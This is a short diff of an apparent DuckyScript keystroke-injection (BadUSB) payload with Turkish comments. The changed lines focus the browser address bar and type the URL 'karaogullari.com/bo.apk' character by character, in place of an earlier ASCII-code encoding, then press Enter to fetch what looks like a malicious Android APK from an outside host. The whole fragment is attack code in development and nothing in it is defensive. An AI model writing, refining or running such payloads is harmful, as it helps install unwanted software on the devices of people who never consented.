@@ -9,9 +9,15 @@ DELAY 700
 CTRL l
 DELAY 300
 
-REM URL yazma (ASCII kodları kullanarak)
+REM URL yazma (karakterleri tek tek yazma)
 REM "karaogullari.com/bo.apk"
-ASCII 107 97 114 97 111 103 117 108 108 97 114 105 46 99 111 109 47 98 111 46 97 112 107
+STRING karaogullari
+KEY 46   REM Nokta (.) yazma
+STRING com
+KEY 47   REM Slash (/) yazma
+STRING bo
+KEY 46   REM Nokta (.) yazma
+STRING apk
 DELAY 300
 ENTER
 DELAY 5000
